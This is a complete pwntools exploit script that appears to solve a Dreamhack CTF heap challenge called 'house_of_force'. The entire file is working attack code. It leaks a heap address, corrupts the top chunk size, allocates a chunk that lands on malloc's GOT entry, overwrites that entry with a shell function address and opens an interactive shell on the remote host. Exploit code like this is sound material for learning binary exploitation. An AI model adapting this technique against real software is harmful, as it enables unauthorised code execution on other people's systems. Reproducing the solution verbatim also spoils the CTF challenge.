from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22790
r = remote(HOST, PORT)
elf = ELF('./house_of_force')

sh=0x0804887e
malloc_got=elf.got['malloc']

def create(size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(size).encode())
    r.sendlineafter(b': ', data)

def write(ptr_idx, write_idx, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(ptr_idx).encode())
    r.sendlineafter(b': ', str(write_idx).encode())
    r.sendlineafter(b': ', str(data).encode())

def exit():
    r.sendlineafter(b'> ', b'3')

create(0x10,b'AAAAAAAA')
leak = int(r.recvuntil(b':').strip(b':\n').strip().decode(), 16)
top_chunk = leak+20

write(0, 5, 0xffffffff)
len=malloc_got-top_chunk-0x8

create(len, b'')
create(4, p32(sh))

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'1')

r.interactive()